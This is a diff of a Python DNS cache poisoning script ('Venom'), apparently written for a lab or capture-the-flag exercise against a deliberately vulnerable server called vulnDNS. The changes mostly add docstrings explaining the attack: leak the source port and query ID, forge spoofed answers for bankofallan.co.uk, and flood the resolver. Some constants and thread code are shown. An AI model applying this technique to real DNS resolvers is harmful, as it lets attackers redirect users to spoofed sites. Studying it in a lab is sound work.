@@ -2,7 +2,12 @@
 # -*- coding: utf-8 -*-
 """Venom DNS server attacker
 
-This script makes
+This program can carry a successful DNS cache poisoning attack versus vulnDNS server.
+The program needs Python 2.7> and root permissions to work properly and it has been tested just on Debian Linux OS.
+To start the program please first install scapy with this command:
+
+(sudo) pip install -r ./requirements.txt # the sudo depends on your OS
+(sudo) python venom.py
 
 """
 import string
@@ -42,7 +47,7 @@ TARGET_IP = "192.168.56.101"  # vulnDNS's IP
 BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
 BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)
 
-SPOOFED_DNS = "10.0.0.1"
+SPOOFED_DNS = "10.0.0.1"  # please see the attached report to know how we manage to find the query ID
 URL_TO_POISON = "bankofallan.co.uk"
 DNS_URL_BADGUY = "badguy.ru"
 
@@ -52,15 +57,22 @@ BUFFER_SIZE = 8192
 
 NUMBER_OF_PACKETS = 2000  # number of packets per attempt
 NUMBER_OF_ATTEMPTS = 250  # if the attack continue to fail, please increase, it is set to lower numbers just for debug
-TIME_SLEEP_SECONDS = 2  # seconds of delay before attack
+TIME_SLEEP_SECONDS = 2  # seconds of delay to synchronize in a naive way the operations
 
+# these parameters will be updated and shared by threads
 ATTACK_GOING_ON = True
-
 TARGET_PORT = 0
 STARTING_QUERY_ID = 0
 
 
 def dns_server_routine():
+    """DNS server routine
+
+    This function simulate a DNS server for "badguy.ru". Its main purposes are:
+    - receiving and parsing DNS recursive requests from vulnDNS in order to get source port and starting query id
+    - answer to vulnDNS (not really necessary for the attack, but hey! It's unpolite to not answer back!)
+
+    """
     print(DNS_ROUTINE_HEADER + "Starting routine of DNS sniffer of badguy.ru")
     global ATTACK_GOING_ON
     global STARTING_QUERY_ID
@@ -84,7 +96,7 @@ def dns_server_routine():
             else:
                 try:
                     first_query_id = decode_dns_message(a[0].getlayer(Raw).load)["id"]
-                except Exception:  # this is usually raised when attack is failed
+                except Exception:  # this is usually raised only when attack is failed
                     print(DNS_ROUTINE_HEADER + "Packet not decoded, probably attack failure! Skipping on...")
                     continue
 
@@ -104,18 +116,46 @@ def dns_server_routine():
 
 
 def randomize_url(url_length=3):
+    """Create a random URL to attach to the URL_TO_POISON to simulate the request of subdomain
+
+    Parameters
+    ----------
+    url_length : int, optional
+        The length of the subdomain (default is 3)
+
+    Returns
+    -------
+    str
+        random string generated with length url_length
+    """
     letters = string.ascii_lowercase
     return "".join(choice(letters) for i in range(url_length)) + "."
 
 
 def random_query_id(modifier=0):
+    """Create a random query id
+
+    Parameters
+    ----------
+    modifier : int, optional
+        Just a simple range modifier (default is 0)
+
+    Returns
+    -------
+    int
+        random query id
+    """
     return randint(1, modifier) % 65536  # 16 bit maximum delimiter of query_id's DNS field
 
 
 def bite_the_rat():
-    """
-    Attack function.
+    """ BiteTheRat attack function.
 
+    This function is the main core of the program:
+        1) Sends the DNS requests for badguy.ru to get query id and source port to vulnDNS
+        2) Creates fake answers packets
+        3) Send the DNS request for bankofallan.co.uk to vulnDNS
+        4) Attack with fake answers packets
 
     """
     global TARGET_PORT
@@ -197,7 +237,7 @@ def bite_the_rat():
 
 def flag_victory_listener():
     """
-    This function listens on port 1337 the Victory flag.
+    This function just listens on port 1337 the Victory flag.
 
     """
     sock = socket(AF_INET,  # Internet
@@ -225,13 +265,15 @@ def flag_victory_listener():
 
 
 def main():
+    """
+    The main() will just launch the threads
+
+    """
     print(MAIN_HEADER + "Initializing attack...")
     flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
     print(MAIN_HEADER + "Listener thread created!")
     print(MAIN_HEADER + "Starting listener to get victory flag...")
     flag_victory_thread.start()
-
-    # point 1: send a dns request for badguy.ru
     print(MAIN_HEADER + "Starting DNS of badguy to get port and initial query id...")
     dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
     bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat)
